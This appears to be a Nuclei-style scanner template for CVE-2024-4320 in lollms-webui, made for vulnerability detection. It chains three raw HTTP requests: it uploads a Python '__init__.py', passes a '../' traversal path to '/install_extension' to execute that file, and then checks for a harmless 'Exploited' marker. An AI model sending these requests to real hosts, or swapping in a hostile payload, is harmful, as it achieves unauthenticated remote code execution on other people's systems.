id: CVE-2024-4320
info:
  author: Kim Dongyoung (Kairos-hk), bolkv, n0ming, RoughBoy0723
  classification:
    cve-id: CVE-2024-4320
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  description: 'Remote Code Execution due to LFI in ''/install_extension'' in parisneo/lollms-webui

    '
  impact: 'Remote Code Execution. lollmscan be exposed to external endpoint or the
    ui when binding to 0.0.0.0 or in headless mode. (can be set via official docs
    here) thus no user interactions are required.

    '
  name: CVE-2024-4320
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-4320
  - https://huntr.com/bounties/d6564f04-0f59-4686-beb2-11659342279b
  severity: Critical
  tags: cve,cve2024, RCE, LFI
requests:
- matchers:
  - status:
    - 200
    type: status
  - type: word
    words:
    - Exploited
  matchers-condition: and
  raw:
  - 'POST /uploadfile/ HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW


    ------WebKitFormBoundary7MA4YWxkTrZu0gW

    Content-Disposition: form-data; name="file"; filename="__init__.py"

    Content-Type: text/x-python


    print("Exploited")

    ------WebKitFormBoundary7MA4YWxkTrZu0gW--

    '
  - "POST /install_extension HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    \n{\n  \"name\": \"../../../../../../../../../../../path/to/uploads/__init__.py\"\
    \n}\n"
  - 'GET /uploads/__init__.py HTTP/1.1

    Host: {{Hostname}}

    '
